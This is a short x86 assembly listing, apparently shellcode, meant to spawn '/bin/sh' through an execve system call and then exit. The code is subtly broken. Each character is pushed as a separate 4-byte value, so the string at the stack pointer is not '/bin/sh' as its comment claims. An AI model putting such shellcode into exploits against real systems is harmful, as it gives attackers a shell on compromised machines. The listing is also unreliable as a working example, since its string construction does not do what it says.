section .text
    global _start

_start:
    xor eax, eax

    push eax
    ; push "/bin/sh" with 0 in reverse order (LE)
    push 0x68
    push 0x73
    push 0x2f
    push 0x6e
    push 0x69
    push 0x62
    push 0x2f

    mov esi, esp        ; esi is address of "/bin/sh"
    xor edx, edx
    push edx            ; edx is NULL
    push esi            ; esi is args[0]

    mov ecx, esp        ; address of args array
    mov ebx, esi        ; "/bin/sh" string
    mov al, 0xb
    int 0x80

    ; exit gracefully
    xor ebx, ebx
    xor eax, eax
    inc eax
    int 0x80
